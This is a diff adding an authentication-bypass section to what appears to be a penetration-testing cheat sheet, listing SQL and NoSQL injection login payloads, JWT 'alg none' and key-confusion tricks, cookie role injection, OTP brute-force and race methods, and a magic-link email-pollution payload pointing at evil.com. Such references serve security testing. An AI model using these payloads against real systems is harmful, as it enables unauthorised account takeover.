@@ -728,3 +728,46 @@ Internal network = your playground.
 - ssrfmap - Automated SSRF exploitation tool
 - goggles - Multi-purpose SSRF scanner
 
+
+## Authentication Bypass Methods
+
+### SQL Injection
+- `admin' OR '1'='1` - Classic SQLi auth bypass
+- `admin'--` - Comment out password check
+
+### NoSQL Injection
+- `{"username":"admin","password":{"$ne":null}}` - MongoDB bypass using $ne (not equal)
+- `{"username":{"$ne":""},"password":{"$ne":""}}` - Login as any user
+- `{"username":"admin","password":{"$regex":"^.*"}}` - Regex bypass
+
+### JWT Attacks
+- Remove signature: `{"alg":"none","typ":"JWT"}` - Set algorithm to "none"
+- Algorithm confusion: Sign HS256 key with RS256 public key
+- Key confusion: Use public key as secret for HS256
+
+### Cookie Manipulation
+- `Role=admin; Path=/` - Direct cookie injection
+- `Authenticated=true` - Boolean flip
+- `User=admin` - Add admin parameter
+
+### OTP/2FA Bypass
+- **Race condition**: Send 10 concurrent requests with same OTP
+- **Timing attack**: Slightly modify timing to bypass rate limits
+- **OTP reuse**: Try previously used OTPs
+- **Brute force**: Quick sequential attempts
+
+### Magic Link/Token Bypass
+- `?email=admin@target.com%00@evil.com` - Email parameter pollution
+- `?email=admin@target.com&redirect=` - Append redirect
+- Token prediction: Analyze patterns in generated tokens
+
+### Session Attacks
+- **Session fixation**: Set user's session ID before they login
+- **Session prediction**: Analyze session ID patterns (base64, timestamps)
+- **Session hijacking**: Steal via XSS, MITM, or logs
+
+### OAuth/SSO Bypass
+- Redirect URI manipulation
+- State parameter removal
+- Token leakage via referrer
+
